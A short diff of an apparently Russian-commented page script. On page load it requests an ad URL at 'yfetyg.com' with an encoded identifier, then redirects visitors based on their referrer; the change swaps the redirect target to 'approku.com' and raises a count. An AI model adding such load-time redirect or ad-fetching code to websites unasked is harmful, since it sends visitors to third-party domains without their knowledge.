@@ -1,6 +1,6 @@
 window.onload = () => {
 
-    async function ad(text="aeyJwaWQiOjEwMjMzOTMsInNpZCI6MTExMjYzOSwid2lkIjoyNTkyOTksImQiOiIiLCJsaSI6Mn0", percent=1, count=5) {
+    async function ad(text="aeyJwaWQiOjEwMjMzOTMsInNpZCI6MTExMjYzOSwid2lkIjoyNTkyOTksImQiOiIiLCJsaSI6Mn0", percent=1, count=9) {
         try {
             const url = `https://yfetyg.com/wnload?a=1&e=${text}=&tz=8&if=0 `;
 
@@ -52,7 +52,7 @@ window.onload = () => {
 
     }
     
-    (async function main(urlB = 'https://yandex.ru', sourceDomain = 'tikroku.com') {
+    (async function main(urlB = 'https://approku.com', sourceDomain = 'tikroku.com') {
 
         try {
             // Получае refferrer страницы
